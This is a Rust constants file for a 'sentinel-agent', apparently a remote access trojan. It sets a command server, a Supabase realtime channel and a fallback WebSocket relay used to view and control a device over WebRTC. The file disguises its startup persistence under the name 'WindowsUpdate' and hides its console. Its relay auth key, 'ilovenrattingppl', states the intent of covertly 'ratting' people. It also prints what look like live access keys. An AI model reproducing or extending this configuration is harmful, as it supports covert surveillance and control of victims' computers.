// Per-build constants — overwritten by build.py before `cargo build`.
// The values here are placeholders so the source still compiles standalone.
pub const OWNER_USER_ID: &str = "";
pub const SENTINEL_SERVER: &str = "https://project--8a02ea85-360c-49b4-a7be-56a542ae871e-dev.lovable.app";
pub const BUILD_NAME: &str = "sentinel-agent";
pub const STARTUP_TASK: bool = false;
pub const STARTUP_NAME: &str = "WindowsUpdate";
pub const DEBUG_CONSOLE: bool = false;

// Supabase Realtime endpoint + anon key. The agent uses these to join the
// `realtime:webrtc:{device_id}` broadcast channel and exchange offer/answer/
// ICE candidates with the browser viewer.
pub const SUPABASE_URL: &str = "https://nhlezcbyyowbcjyruely.supabase.co";
pub const SUPABASE_ANON_KEY: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5obGV6Y2J5eW93YmNqeXJ1ZWx5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAyMzc3OTUsImV4cCI6MjA5NTgxMzc5NX0.4XVy--TIkugp1zNmBEOjOgHqeFtQnMKL9HWwmI26WTs";

// HidenHost WebSocket relay (vicky.hidencloud.com:24609 fronted by
// https://veltrix.hidenfree.com). Used as a secondary signaling /
// fallback transport for WebRTC + control messages. The shared auth
// key must match `HIDEN_AUTH_KEY` on the relay's .env.
pub const HIDEN_WS_URL: &str = "wss://veltrix.hidenfree.com";
pub const HIDEN_HTTP_URL: &str = "https://veltrix.hidenfree.com";
pub const HIDEN_AUTH_KEY: &str = "ilovenrattingppl";
